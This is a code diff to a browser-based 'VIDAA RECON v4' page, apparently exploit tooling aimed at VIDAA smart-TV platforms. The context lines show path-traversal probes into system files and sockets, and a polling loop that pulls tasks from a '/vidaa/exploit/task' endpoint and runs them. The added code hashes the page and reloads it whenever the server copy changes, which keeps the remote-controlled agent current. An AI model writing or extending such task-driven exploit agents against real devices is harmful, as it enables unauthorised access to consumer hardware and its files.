@@ -41,6 +41,13 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
                       "../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/services/serviceList.json",
                       "../var/run/superwatch_socket", "../var/local", "../OAD/AppUpgradeSwitch.json"];
   var goodBase = null;
+  var SELF_SHA = null;
+  function djb2(s) { var h = 5381; for (var i = 0; i < s.length; i++) { h = ((h * 33) + s.charCodeAt(i)) >>> 0; } return h.toString(16).padStart(8, "0"); }
+  function captureSelf() {
+    return fetch(location.href).then(function (r) { return r.text(); })
+      .then(function (t) { SELF_SHA = djb2(t); })
+      .catch(function () {});
+  }
 
   function parseVendor(r) {
     if (!r) return r;
@@ -251,6 +258,11 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
       try {
         var r = await fetch("/vidaa/exploit/task?seen=" + seen, { method: "GET" });
         var j = JSON.parse(await r.text());
+        if (j && j.page_sha && SELF_SHA && j.page_sha !== SELF_SHA) {
+          st("VIDAA RECON: page updated on server - auto-reloading...");
+          location.reload();
+          return;
+        }
         if (j && j.task && j.rev > seen) {
           seen = j.rev;
           st("VIDAA RECON v4: running task rev=" + seen + " op=" + (j.task.op || "?"));
@@ -272,6 +284,7 @@ body{background:#000;color:#0f0;font:24px/1.35 monospace;margin:.5em;}
 
   async function run() {
     st("VIDAA RECON v4: running...");
+    await captureSelf();
     probeGlobals();
     det("native uptime lane: " + (R.native.uptime && R.native.uptime.ret ? "WORKS" : "no/blocked"));
     for (var g = 0; g < BASES.length; g++) R.get_reach[BASES[g]] = await getReach(BASES[g]);
